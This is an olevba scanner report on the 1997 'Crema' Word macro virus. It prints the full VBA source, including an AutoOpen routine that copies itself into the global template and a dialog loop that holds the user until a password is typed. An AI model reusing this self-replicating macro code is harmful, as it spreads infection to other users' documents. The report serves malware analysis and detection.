olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Crema-fb53e5b868dce400a0d55db5b626a332f249f745
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Crema-fb53e5b868dce400a0d55db5b626a332f249f745 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO archivoplantillas.bas 
in file: Virus.MSWord.Crema-fb53e5b868dce400a0d55db5b626a332f249f745 - OLE stream: 'Macros/VBA/archivoplantillas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
A$ = "llora llora cagon la " + Chr(34) + "U" + Chr(34) + " saldra campeon!!"
WordBasic.MsgBox A$, 64
End Sub
-------------------------------------------------------------------------------
VBA MACRO aUtoopen.bas 
in file: Virus.MSWord.Crema-fb53e5b868dce400a0d55db5b626a332f249f745 - OLE stream: 'Macros/VBA/aUtoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim me_$
Dim this$
Dim origin$
Dim F$
Dim G$
Dim I
Dim B$
Dim M$
Dim tipo
On Error GoTo -1: On Error GoTo Peru
me_$ = "Bl4cK Sc4v3ng3R"
this$ = "Crema Virus"
origin$ = "PERU"
If Rnd() < 0.1 Then
WordBasic.MsgBox me_$ + " - " + origin$, this$, 64
End If
F$ = WordBasic.[FileName$]()
G$ = "Global"
If (WordBasic.CountMacros(0) < 4) Then
For I = WordBasic.CountMacros(1) To 1 Step -1
B$ = WordBasic.[MacroName$](I, 1)
M$ = ":" + B$
WordBasic.MacroCopy F$ + M$, G$ + M$, 1
Next
Else
tipo = 1
If (WordBasic.CountMacros(1) < 4) Then
WordBasic.FileSaveAs Name:=F$, Format:=1
For I = WordBasic.CountMacros(0) To 1 Step -1
B$ = WordBasic.[MacroName$](I, 0)
M$ = ":" + B$
WordBasic.MacroCopy G$ + M$, F$ + M$, 1
Next
End If
End If
WordBasic.Call "CREMA"
Peru:
End Sub
-------------------------------------------------------------------------------
VBA MACRO CREMA.bas 
in file: Virus.MSWord.Crema-fb53e5b868dce400a0d55db5b626a332f249f745 - OLE stream: 'Macros/VBA/CREMA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim dlg As Object
Dim A$
If WordBasic.Int(Rnd() * 10) = 1 Then
WordBasic.BeginDialog 228, 163, "SOY CREMA!!!! :-)"
WordBasic.TextBox 35, 76, 160, 18, "TextBox1$", 0
WordBasic.Text 35, 21, 139, 13, "ESE ES LA U!!!!! "
WordBasic.Text 33, 43, 165, 13, "El mejor de los equipos!!"
WordBasic.OKButton 66, 115, 88, 21
WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
A$ = ""
On Error GoTo -1: On Error GoTo 2
2:  Err.Number = 0
While A$ <> "universitario" And A$ <> "lolo" And A$ <> "peru" And A$ <> "sc4v3ng3r"
WordBasic.Dialog.UserDialog dlg
WordBasic.CurValues.UserDialog dlg
A$ = LCase(dlg.TextBox1$)
Wend
End If
WordBasic.DisableInput 0
If WordBasic.Int(Rnd() * 10) = 2 Then
WordBasic.MsgBox "Buena Crema!", "Tu tambien eres hincha!", 64
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO HerramMacro.bas 
in file: Virus.MSWord.Crema-fb53e5b868dce400a0d55db5b626a332f249f745 - OLE stream: 'Macros/VBA/HerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem Bl4ck Sc4v3ng3R - PERU 1997
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUtoopen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |<DT                 |PERU                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
